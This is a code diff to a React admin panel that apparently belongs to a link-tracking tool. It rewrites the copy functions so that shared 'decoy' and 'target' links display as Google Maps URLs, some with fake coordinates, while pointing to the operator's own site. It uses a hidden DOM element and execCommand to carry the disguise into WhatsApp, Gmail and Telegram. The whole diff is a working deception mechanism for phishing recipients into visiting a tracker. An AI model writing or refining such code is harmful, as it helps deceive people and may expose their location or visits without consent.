@@ -65,58 +65,67 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
     setGeneratedLink(link);
   };
 
-  // Generic Link Copy (No Coords)
-  const copyGenericLink = async () => {
-    const baseUrl = window.location.origin;
-    const fakeVisualUrl = "https://www.google.com/maps";
-
+  /**
+   * ROBUST MASKING FUNCTION
+   * Creates a hidden DOM element with an anchor tag, selects it, and executes 'copy'.
+   * This is more compatible with WhatsApp/Gmail/Office than the Clipboard API Blob method.
+   */
+  const performMaskedCopy = (realUrl: string, displayUrl: string) => {
     try {
-        const htmlContent = `<a href="${baseUrl}">${fakeVisualUrl}</a>`;
-        const blobHtml = new Blob([htmlContent], { type: "text/html" });
-        const blobText = new Blob([baseUrl], { type: "text/plain" });
+        // 1. Create a temporary container
+        const tempDiv = document.createElement('div');
+        tempDiv.style.position = 'absolute';
+        tempDiv.style.left = '-9999px';
+        tempDiv.style.whiteSpace = 'pre'; // Preserve formatting
+        
+        // 2. Inject the "Masked" HTML: An anchor tag where Text != Href
+        tempDiv.innerHTML = `<a href="${realUrl}" style="color: #0000EE; text-decoration: underline;">${displayUrl}</a>`;
+        
+        document.body.appendChild(tempDiv);
+        
+        // 3. Select the content
+        const range = document.createRange();
+        range.selectNode(tempDiv);
+        const selection = window.getSelection();
+        
+        if (selection) {
+            selection.removeAllRanges();
+            selection.addRange(range);
+            
+            // 4. Execute Copy
+            const successful = document.execCommand('copy');
+            
+            // Cleanup
+            selection.removeAllRanges();
+            document.body.removeChild(tempDiv);
 
-        const data = [new ClipboardItem({
-            ["text/html"]: blobHtml,
-            ["text/plain"]: blobText
-        })];
-
-        await navigator.clipboard.write(data);
-        alert('Universal Link Copied! \n\n[MASKING ACTIVE]\nVisual: ' + fakeVisualUrl + '\nTarget: Your System Root');
+            if (successful) {
+                alert(`Link Copied!\n\n[MASKING ACTIVE]\nVisual: ${displayUrl}\n\nPaste into WhatsApp, Gmail, or Telegram to see the masking effect.`);
+            } else {
+                throw new Error('execCommand returned false');
+            }
+        }
     } catch (err) {
-        console.error("Rich copy failed", err);
-        navigator.clipboard.writeText(baseUrl);
-        alert('Link copied (Plain Text Mode). Browser did not support masking.');
+        console.error("Masking failed, fallback to plain text", err);
+        navigator.clipboard.writeText(realUrl);
+        alert('Browser blocked masking. Plain link copied instead.');
     }
   };
 
+  // Generic Link Copy (No Coords)
+  const copyGenericLink = () => {
+    const baseUrl = window.location.origin;
+    // For universal link, we make it look like the root Google Maps domain
+    const fakeVisualUrl = "https://www.google.com/maps";
+    performMaskedCopy(baseUrl, fakeVisualUrl);
+  };
+
   // Specific Target Link Copy
-  const copyTargetLink = async () => {
+  const copyTargetLink = () => {
     if (!generatedLink) return;
-
-    // The Fake Visual URL (What the user sees in the text)
+    // For target link, we show the fake coordinates in the visual URL
     const fakeVisualUrl = `https://maps.google.com/maps?q=${targetLat},${targetLng}`;
-    
-    try {
-        // Create both HTML (for rich text apps like WhatsApp Web, Gmail, Word) 
-        // and Plain Text (fallback)
-        const htmlContent = `<a href="${generatedLink}">${fakeVisualUrl}</a>`;
-        
-        const blobHtml = new Blob([htmlContent], { type: "text/html" });
-        const blobText = new Blob([generatedLink], { type: "text/plain" });
-
-        const data = [new ClipboardItem({
-            ["text/html"]: blobHtml,
-            ["text/plain"]: blobText
-        })];
-
-        await navigator.clipboard.write(data);
-        alert('Decoy Link Copied! \n\n[MASKING ACTIVE]\nIf you paste this into Email/WhatsApp, it will look like:\n' + fakeVisualUrl + '\n\nBut it links to your system.');
-    } catch (err) {
-        console.error("Rich copy failed", err);
-        // Fallback to simple copy
-        navigator.clipboard.writeText(generatedLink);
-        alert('Link copied (Plain Text Mode). Browser did not support masking.');
-    }
+    performMaskedCopy(generatedLink, fakeVisualUrl);
   };
 
   return (
@@ -237,7 +246,8 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
             
             <p className="text-xs text-slate-400 mt-4 text-center border-t border-slate-100 pt-3">
                 <i className="fa-solid fa-circle-info mr-1"></i> 
-                Both links utilize <b>HTML Injection</b> to mask the URL in rich-text environments (WhatsApp Web, Gmail, etc).
+                Both links utilize <b>HTML Injection</b> to mask the URL in rich-text environments (WhatsApp Web, Gmail, etc). 
+                <b> Note:</b> Pasting into a browser address bar will always show the real URL.
             </p>
         </div>
 
